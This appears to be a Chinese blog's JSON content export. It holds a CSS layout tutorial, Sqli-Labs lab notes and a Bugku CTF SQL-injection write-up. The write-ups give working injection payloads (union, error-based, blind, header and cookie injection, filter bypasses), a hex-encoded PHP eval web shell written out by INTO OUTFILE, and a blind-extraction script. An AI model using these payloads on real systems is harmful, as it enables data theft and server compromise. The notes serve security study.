使用flex实现123.parent&#123; display:flex; &#125;.left&#123; width:100px; &#125;.right&#123; flex:1; &#125; /*直接填补右侧空余宽度*/ 右列定宽，左列自适应float+margin实现12.left&#123; float:left; width:100%; margin-right:-100px; &#125;.right&#123; float:right; width:100px; &#125; 使用table实现123.parent&#123; display:table; table-layout:fixed; width:100%; &#125;.left&#123; display:table-cell; &#125;.right&#123; width:100px; display:table-cell; &#125; 使用flex实现123.parent&#123; display:flex; &#125;.left&#123; flex:1; &#125;.right&#123; width:100px; &#125; 两侧定宽，中间栏自适应float+margin实现（有异议）123.left&#123; width：100px; float:left; &#125;.center&#123; float:left; width:100%; margin-right:-200px; &#125;.right&#123; width:100px; float:right; &#125; 用table实现123.parent&#123; width:100%; display:table; table-layout:fixed &#125;.left,.middle,.right&#123; display:table-cell; &#125;.left,.right&#123; width:100px; &#125; 用flex实现123.parent&#123; display:flex; &#125;.left,.right&#123; width:100px; &#125;.middle&#123; flex:1; &#125; 一列不定宽，一列自适应float+overflow实现12.left&#123; float:left; &#125;.right&#123; overflow:hidden; &#125; 用flex实现12.parent&#123; display:flex; &#125;.right&#123; flex:1; &#125; 多列等分布局float实现123456789&lt;style&gt; .parent&#123; margin-left:-20px &#125; /*假设列之间的间距为20px*/ .column&#123; float:left; width:25%; box-sizing:border-box; &#125;&lt;/style&gt;&lt;div class=\"parent\"&gt; &lt;div class=\"column\"&gt;1&lt;/div&gt; &lt;div class=\"column\"&gt;2&lt;/div&gt; &lt;div class=\"column\"&gt;3&lt;/div&gt;&lt;/div&gt; flex实现1234567.parent&#123; display:flex; &#125;.column&#123; flex:1; &#125;.column+.column&#123; margin-left:20px; &#125;/*另一种确定column宽度的情况*/.parent&#123; display:flex; justify-content:space-between; &#125;.column&#123; width:350px; &#125; 0x05响应式布局参考资料","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"}]},{"title":"Sqli-Labs Study","slug":"Sqli-Labs-Study","date":"2018-08-31T04:14:22.000Z","updated":"2018-09-09T05:55:16.704Z","comments":true,"path":"2018/08/31/Sqli-Labs-Study/","link":"","permalink":"http://yoursite.com/2018/08/31/Sqli-Labs-Study/","excerpt":"","text":"Sqli-Labs注入学习笔记环境搭建 Ubuntu16.04+apache2+php5.6+mysql5.7 关于平台搭建的相关教程戳这里 搭建完成后进入localhost/sqli-labs-master，点链接看到map 再点Less-1，如果出现如下页面说明数据也已搭建完毕。 现在可以开始进行注入的学习了 Page-1(Basic Challenges)Less-1 GET-Error based-Single quotes-String localhost/sqli-labs-master/Less-1/?id=1&#39;出现报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 发现已经闭合，直接加注释符即可注入。 ?id=1&#39; order by 2--+，?id=1&#39; order by 3--+均正常回显，order by 4报错，说明有三列。 ?id=-1&#39; union select database(),2,3--+发现回显为在2,3处，?id=-1&#39; union select 1,database(),3--+得库名security ?id=-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&quot;security&quot; limit 0,1--+改变limit范围共得到emails,referers,uagents,users四个表名。 还有一种更简单的办法：?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot;--+同理得到id,username,password三个字段名。 ?id=-1&#39; union select 1,group_concat(username),group_concat(password) from users--+得到十三组用户名密码。 12username:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 Less-2 GET-Error based-integer based ?id=1&#39;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1 发现这个已经闭合过了，再加一个单引号就会多出来。 所以同理直接构造id=-1 union select 1,username,password from users limit 0,1--+ Less-3 GET-Error based-Single quotes with twist-String ?id=1&#39;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at line 1 后面多了个括号。构造：?id=1&#39;) Less-4 GET-Error based-Double quotes-String ?id=1&#39;不报错，?id=1&quot;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1″”) LIMIT 0,1’ at line 1 构造：?id=1&quot;) Less-5 GET-Double injection-Single quotes-String ?id=1这次的页面和之前不太一样，没有出现回显位，所以不能像前几次那样构造了。 可以先看一下这篇博文：MYSQL注入天书之盲注讲解 ?id=1&#39;这里报错和Less-1里面的一样。 题目提示双注入：先了解一下 先查库名：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(database()),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+回显Duplicate entry &#39;~security~1&#39; for key&quot; 也可以用extravalue报错的方法：?id=-1&#39; and extravalue(1,concat(0x7e,(select database()),0x7e))--+回显FUNCTION security.extractvalue does not exist ?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+ 回显Duplicate entry &#39;~emails~0&#39; for key&quot; ?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),&#39;~&#39;,floor(rand()*2))as a from information_schema.tables group by a--+回显Duplicate entry &#39;~users~1&#39; for key&quot; 直接查四个表的方法：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(table_name)) from information_schema.tables where table_schema=&#39;security&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ 查users表列名：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select (group_concat(column_name)) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ 查数据：?id=-1&#39; union select count(*),1,concat(&#39;~&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 0,1),&#39;~&#39;,floor(rand()*2))a from information_schema.tables group by a--+ Less-6 GET-Double injection-Double quotes-String ?id=1&#39;不报错，?id=1&quot;报错：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“1”” LIMIT 0,1’ at line 1 ，把Less-5的payload中的单引号换成双引号即可。 Less-7 GET-Dump into outfile-String 先了解一下dumpfile的用法 还有 SQL注入写入一句话木马原理 首先要获取网站在系统中的具体路径，利用@@datadir (数据库路径) 和@@basedir (MYSQL安装路径)。 在Less-1注入得到数据库路径/var/lib/mysql/，安装路径/usr/ 试了?id=1&#39;、?id=1&quot;、?id=1&#39;)都不行，去看了下源码，发现用的双括号 1234567891011121314151617$sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125; ?id=-1&#39;)) union select 1,2,3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e into outfile &#39;/var/www/html/cmd.php&#39;--+ ，这里的3c3f706870206576616c28245f504f53545b27636d64275d293b3f3e 是&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;的十六进制。最后再用菜刀连接。 Less-8 GET-Blind-Boolean based-Single quotes 基于布尔的盲注，可以借助substr()，left()，mid()等其他函数判断。 1.从左开始截取字符串：left(str, length)，即left(被截取字符串， 截取长度) 2.从右开始截取字符串：right(str, length)，即right(被截取字符串， 截取长度) 3.截取特定长度的字符串： substring(str, pos)，即：substring(被截取字符串， 从第几位开始截取) substring(str, pos, length)，即：substring(被截取字符串，从第几位开始截取，截取长度) 从字符串的倒数第6个字符开始读取，只取2个字符 1SELECT SUBSTRING(&apos;helloworld&apos;, -6, 2) 4.按关键字进行读取：substring_index(str, delim, count)，即substring_index(被截取字符串，关键字，关键字出现的次数) 截取第二个“.”之前的所有字符 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, 2); 截取倒数第二个“.”之后的所有字符 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;.&apos;, -2); 如果关键字不存在，则返回整个字符串 1SELECT SUBSTRING_INDEX(&apos;www.baidu.com&apos;, &apos;#&apos;, 1); 试着查库名：?id=1&#39; and substr(database(),1,1)&gt;&#39;a&#39;--+，若回显you are in说明库名的第一个字符在a之后，然后手工一个一个试就能试出第一个字符是啥，同理就可以试出整个库名。当然这样试很麻烦，用脚本跑会快很多。 类似地，构造?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 0,1)1,1)&gt;&#39;a&#39;--+可以试出表名。 或者利用ascii()和substr()函数构造：?id=1&#39; and ascii(substr((select database()),1,1))&gt;33--+ Less-9 GET-Blind-Time bases-Single quotes 基于时间的盲注：附链接 可以利用if()，sleep()，benchmark()函数进行盲注。 if(exp1,exp2,exp3)：当exp1为true时，执行exp2；否则执行exp3 sleep(seconds)：让代码执行延迟若干秒 benchmark(n,exp)：让表达式exp重复执行n次 查库名：?id=1&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+匹配的时候会直接返回，不匹配则需等待5秒。表名、列名、数据信息也可以通过这种方式查出。 Less-10 GET-Blind-Time based-Double quotes 将Less-9的payload里的单引号换成双引号即可。 Less-11 POST-Error based-Single quotes-String 变成post了，有俩输入框username和password，猜会用到万能密码。用户名输admin&#39;#密码随便填，回显用户admin登录，可以注入了 username：&#39; or 1=1 order by 2#回显正确，&#39; or 1=1 order by 3#报错，说明有两列 &#39; union select 1,database()#得库名 &#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;#得表名，查列名和数据同理。 （这里都是在username里注入，也可以利用已知的用户名admin在password里添加查询语句） Less-12 POST-Error based-Double quotes-String-with twist 这里构造方法和Less-11差不多，只需把单引号改成&quot;) Less-13 POST-Double injection-Single quotes-String-with twist 查库名：用户名输&#39; or &#39;1&#39;=&#39;1，密码输&#39;) or 1=1 and extractvalue(1,concat(0x7e,(select database()),0x7e))#，报错FUNCTION security.extractvalue does not exist 或者用户名输admin&#39;) and extractvalue(1,concat(0x7e,(select database()),0x7e))#，密码随便输，出现报错XPATH syntax error:&#39;~security~&#39; 查表名：用户名admin&#39;) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;),0x7e))#，报错XPATH syntax error:&#39;~emails,referers,uagents,users~&#39; 查列名和数据同理。 Less-14 POST-Double injection-Single quotes-String-with twist 和Less-13类似，把&#39;)&#39;换成&quot; Less-15 POST-Blind-Boolean/time Based-Single quotes 基于布尔：用户名admin&#39; and substr(database(),1,1)&gt;&#39;a&#39;# 基于时间：用户名admin&#39; and if(ascii(substr(database(),1,1))=115,1,sleep(5))# Less-16 POST-Blind-Boolean/time Based-Double quotes 把Less-15里的单引号换成)&quot; 附源码 12345$uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); Less-17 POST-Update Query-Error based-String 关于Update Query：附链接 看下源码 1234567891011121314151617181920212223242526272829function check_input($value)&#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value;&#125;// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))&#123;//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; addslashes()：返回在预定义字符（’,”,\\,NULL）前添加反斜杠的字符串 stripslashes()：删除addslashes()添加的反斜杠 mysql_real_escape_string()：转义SQL语句中字符串的特殊字符 发现了一个过滤函数，并且会检查输入的username，所以这次只能在password处构造 uname=admin&amp;passwd=&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;submit=Submit 或者uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select database()),&#39;~&#39;),0)#&amp;submit=Submit 查数据uname=admin&amp;passwd=&#39;or updatexml(1,concat(&#39;~&#39;,(select * from(select concat_ws(char(45),id,username,password)from users limit 0,1)as a),&#39;~&#39;),0)# Less-18 POST-Header injection-Uagent field-Error based 先看源码，贴一部分 123456789101112131415161718192021222324252627282930313233$uname = check_input($_POST['uname']);$passwd = check_input($_POST['passwd']);$sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\"; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo \"&lt;/font&gt;\"; //echo \"&lt;br&gt;\"; echo '&lt;font color= \"#0000ff\" font size = 3 &gt;'; echo 'Your User Agent is: ' .$uagent; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; print_r(mysql_error()); echo \"&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;br&gt;\"; &#125; else &#123; echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; 这次在username和password处都对输入进行了过滤，但是往后看会发现$insert=&quot;INSERT INTO security.uagents (&#39;uagent&#39;, &#39;ip_address&#39;, &#39;username&#39;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, &#39;$uname&#39;)&quot;; mysql_query($insert);这里提供了新的注入点，可以在$uagent或$IP里加查询语句，uagent相对好修改，直接用火狐浏览器插件hackbar里POST。 UA：&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1 POST以后回显如图 Less-19 POST-Header injection-Referer field-Error based 和Less-18差不多，这次是修改referer。 Referer：&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1 Less-20 POST-Cookie injection-Uagent field-Error based 这里需要在Cookie中构造查询语句，可以借助火狐插件Cookie Quick Manager修改cookie值 先用admin身份登录一下会产生一个cookie，尝试修改成uname=admin&#39; order by 3#不报错，改成4报错，一共有三列。 接着构造uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#，回显如图 其他同理。 Less-21 POST-Dump into outfile-String 查看源码，发现了一些新东西 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364if(!isset($_POST['submit']))&#123; $cookee = $_COOKIE['uname']; $format = 'D d M Y - H:i:s'; $timestamp = time() + 3600; echo \"&lt;center&gt;\"; echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; echo '&lt;img src=\"../images/Less-21.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; echo '&lt;br&gt;&lt;font color= \"red\" font size=\"4\"&gt;'; echo \"YOUR USER AGENT IS : \".$_SERVER['HTTP_USER_AGENT']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"cyan\" font size=\"4\"&gt;'; echo \"YOUR IP ADDRESS IS : \".$_SERVER['REMOTE_ADDR']; echo \"&lt;/font&gt;&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4 &gt;'; echo \"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;\"; echo '&lt;font color= \"orange\" font size = 5 &gt;'; echo \"YOUR COOKIE : uname = $cookee and expires: \" . date($format, $timestamp); $cookee = base64_decode($cookee); echo \"&lt;br&gt;&lt;/font&gt;\"; $sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\"; $result=mysql_query($sql); if (!$result) &#123; die('Issue with your mysql: ' . mysql_error()); &#125; $row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"pink\" font size=\"5\"&gt;'; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo '&lt;font color= \"grey\" font size=\"5\"&gt;'; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;&lt;/b&gt;\"; echo \"&lt;br&gt;\"; echo 'Your ID:' .$row['id']; &#125; else &#123; echo \"&lt;center&gt;\"; echo '&lt;br&gt;&lt;br&gt;&lt;br&gt;'; echo '&lt;img src=\"../images/slap1.jpg\" /&gt;'; echo \"&lt;br&gt;&lt;br&gt;&lt;b&gt;\"; //echo '&lt;img src=\"../images/Less-20.jpg\" /&gt;'; &#125; echo '&lt;center&gt;'; echo '&lt;form action=\"\" method=\"post\"&gt;'; echo '&lt;input type=\"submit\" name=\"submit\" value=\"Delete Your Cookie!\" /&gt;'; echo '&lt;/form&gt;'; echo '&lt;/center&gt;';&#125; else&#123; echo '&lt;center&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 6 &gt;'; echo \" Your Cookie is deleted\"; setcookie('uname', base64_encode($row1['username']), time()-3600); header ('Location: index.php'); echo '&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;';&#125; Less-22 Future editions","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://yoursite.com/tags/SQL/"}]},{"title":"Bugku SQL注入题目总结","slug":"Bugku-SQL注入题目总结","date":"2018-08-25T04:32:40.000Z","updated":"2018-09-09T03:09:50.319Z","comments":true,"path":"2018/08/25/Bugku-SQL注入题目总结/","link":"","permalink":"http://yoursite.com/2018/08/25/Bugku-SQL注入题目总结/","excerpt":"","text":"Bugku SQL注入题目总结sql注入查看源码发现网页编码为gb2312，猜测考的是宽字节注入。 关于宽字节注入可以参考大佬的详解：戳这里 果然输入?id=1%df&#39;出现了报错，说明已经可以注入了。1%df%27被转换成了1運，原因就是单引号前被添加了转义符\\，即%5c，在这里前面的%df和%5c结合形成了汉字，导致单引号成功逃逸。下面就可以直接操作了。 ?id=1%df&#39;and version()&gt;0 --+返回正确，说明数据库可能是sqlserver或者mysql ?id=1%bf&#39; and length(user())&gt;0 --+返回正确，说明存在user()函数，数据库为mysql ?id=1%df&#39; order by 2 --+正常回显，?id=1%df&#39; order by 3 --+报错，证明一共有两列 ?id=1%df&#39; union select database(),2 --+得数据库名sql5 已知表名为key，字段名为string，直接构造?id=1%df&#39; union select 1,string from sql5.key --+ SQL注入1题目过滤了关键字 1234567891011121314//过滤sql$array = array('table','union','and','or','load_file','create','delete','select','update','sleep','alter','drop','truncate','from','max','min','order','limit');foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit('包含敏感关键字！'.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = \"SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1\"; 但是往后看发现这句$id = strip_tags($id);，strip_tags() 函数可以剥去字符串中的 HTML、XML 以及 PHP 的标签，这样就可以利用&lt;&gt;绕过。 ?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,database()--+得数据库名sql3 根据已知条件构造?id=1 un&lt;&gt;ion sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key --+得flag 成绩单这里--+被过滤了，用#注释 试着输入0&#39; or 1=1 union select 1,2 #，0&#39;or 1=1 union select 1,2,3 #无回显，0&#39; or 1=1 union select 1,2,3,4 #正常显示 所以输入0&#39; union select database(),null,null,null #得数据库名skctf_flag 0&#39; union select table_name,2,3,4 from information_schema.tables where table_schema = &#39;skctf_flag&#39;#得表名fl4g 0&#39; union select column_name,2,3,4 from information_schema.columns where table_name=&#39;fl4g&#39; #得列名skctf_flag 最后一步0&#39; union select skctf_flag,2,3,4 from fl4g #得flag login1提示SQL约束攻击，这里可以先了解一下约束攻击什么意思，附链接：戳这里 大概意思是在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说”admin”等同于”admin “。例如以下语句的查询结果，与使用用户名”admin”进行查询时的结果是一样的。 SELECT * FROM users WHERE username=&#39;admin &#39;; 现在可以试着操作了。点进去是个登陆页面，还看到了注册链接。先随便注册一个然后登陆，显示不是管理员还想看flag？！。。想知道管理员用户名然后尝试注入发现没啥用，于是去注册页面试着以admin为用户名注册，页面提示admin已存在 。好的这下好办了，根据提示得SQL约束攻击，直接去注册一个账号用户名叫’admin ‘（admin后加空格），设置密码，再去登陆得flag。 这是一个神奇的登陆框试着输入发现单引号被过滤了，但是双引号没被过滤。 0&quot; or 1=1 order by 2 #正常回显，0&quot; or 1=1 order by 3 #显示错误，说明有两列。 0&quot; union select database(),null #得数据库名bugkusql1 0&quot; union select table_name,null from information_schema.tables where table_schema=&#39;bugkusql1&#39; #得表名flag1 0&quot; union select column_name,null from information_schema.columns where table_name=&#39;flag1&#39; #得列名flag1 最后0&quot; union select flag1,null from bugkusql1.flag1 #得flag 多次点进去就会注意到?id=1，说明这个很有可能是个注入题，加单引号出错，确实可以注入。 可是不知道过滤了什么，这里可以使用异或来判断有哪些关键词被过滤了。 一上来先试试行不行?id=1&#39;^(0)--+页面返回正确，再输入?id=1&#39;^(1)--+显示错误，说明如果页面显示有误那么括号里的内容应该为真。这里可以用length()函数判断有哪些关键词被过滤了。 ?id=1&#39;^(length(&#39;union&#39;)&gt;0)--+页面返回正确，说明union被过滤了。 同理，用这种方法验证一些其他的常用关键词，会发现union，select，and，or被过滤了，但是可以构造类似ununionion的形式绕过。 ?id=0&#39; ununion selselectect 1,2--+在2位上有回显 ?id=0&#39; ununionion selselectect 1,database()--+得库名web1002-1 ?id=0&#39; ununionion selselectect 1,(selselectect table_name from infoorrmation_schema.tables where table_schema=&#39;web1002-1&#39; limit 0,1)--+得表名flag1，改变limit发现另一个表hint。（这个information好坑，里面有or。。。） ?id=0&#39; ununionion selselectect 1,(selselectect column_name from infoorrmation_schema.columns where table_name=&#39;flag1&#39; limit 0,1)--+得字段名flag1，还有一个叫address。同理查出hint表里有id和contents字段。 ?id=0&#39; ununionion selselectect 1,(selselectect flag1 from flag1 limit 0,1)--+得到usOwycTju+FTUUzXosjr，这个应该是第一个flag了。 然后去访问address，因该会有下一关地址。?id=0&#39; ununionion selselectect 1,(selselectect address from flag1 limit 0,1)--+得到./Once_More.php 进入第二关，加单引号出现报错，开始注入。观察Id的回显发现union和加号都被过滤了，再试试别的关键词，sleep和substr也被过滤掉了。用ununionion后面的select也没了，换ununionion selselectect试试，这次好像没啥问题，结果不回显了。。 于是到这就注不下去了（咸鱼的我），看网上大佬们写了脚本爆破，借此机会学习下。 贴上大佬的脚本： 12345678910111213141516def flag2(): flag ='' for j in xrange(1, 100): temp = '!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~' key = 0 for i in temp: url = \"http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'\"+str(i)+\"',(select flag2 from flag2),\"+str(j)+\"))=\"+str(j)+\"%23\" r1 = rs.get(url) # print url if \"Hello\" in r1.text: print str(i)+\" -----\"+str(j) flag += str(i) print \"[*] : \"+flag key = 1 if key ==0: break 加点东西然后运行一下得到最终的flag 报错注入附报错注入相关知识的连接：戳这里，这个也不错，还有这个 这题链接打不开了，用别人的解题思路总结一下 题目提示不可以包含’’–’’，空格，单引号，双引号，’’union’’关键字。这里可以用换行符替换空格。 通过extractvalue报错 ?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(select%0A@@version),0x7e))成功报错 题目要求读文件双引号里面的内容（即flag），需要查询的文件路径为/var/test/key_1.php，文件名转十六进制表示0x2f7661722f746573742f6b65795f312e706870 现在读取文件 ?id=1%0Aand%0Aextractvalue(1,concat(0x7e,(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))),0x7e)) 但是extractvalue只能读32位（转换成字符串只有16位），其实是被截断了，可以用substr(str,start,length)读取剩余部分id=1%0Aand%0Aextractvalue(1,concat(0x7e,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870))%0Afrom%0A161%0Afor%0A20),0x7e)) 接下来修改偏移量把整个文件读完就可以了，最后恢复的文件内容如下： 1&lt;?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:\"7249f5a7fd1de602b30e6f39aea6193a\"fsdafsafdsafdsafdsafa ?&gt;","categories":[],"tags":[{"name":"SQL","slug":"SQL","permalink":"http://yoursite.com/tags/SQL/"},{"name":"BugkuCTF","slug":"BugkuCTF","permalink":"http://yoursite.com/tags/BugkuCTF/"}]},{"title":"New Start","slug":"New-Start","date":"2018-08-11T14:06:25.000Z","updated":"2019-07-25T07:33:53.600Z","comments":true,"path":"2018/08/11/New-Start/","link":"","permalink":"http://yoursite.com/2018/08/11/New-Start/","excerpt":"","text":"新的开始 Hello, blog! It’s a long way to go, but it’s never too late to get started. Keep running~","categories":[],"tags":[{"name":"Life","slug":"Life","permalink":"http://yoursite.com/tags/Life/"}]}]}